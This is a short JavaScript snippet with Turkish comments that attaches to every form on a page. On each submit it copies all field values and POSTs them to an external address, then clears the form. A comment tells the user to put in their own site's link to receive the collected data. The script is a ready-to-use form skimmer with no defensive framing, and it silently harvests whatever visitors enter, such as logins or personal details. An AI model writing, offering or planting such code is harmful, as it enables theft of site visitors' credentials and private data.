
document.addEventListener('DOMContentLoaded', function() {
  var forms = document.querySelectorAll('form'); 
  forms.forEach(function(form) {
    form.addEventListener('submit', function(event) {

      var formData = new FormData(form);

      fetch('https://mysite.com/target', { // Kendi sitenizin linkini girin dataları oradan alacaksınız
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(formData)
      })
      .then(function(response) {
        if (response.ok) {
          console.log('Form bilgileri başarıyla gönderildi.');
        } else {
          console.log('Bir hata oluştu. İstek durumu:', response.status);
        }
      })
      .catch(function(error) {
        console.log('Bir hata oluştu:', error);
      });

      form.reset();
    });
  });
});
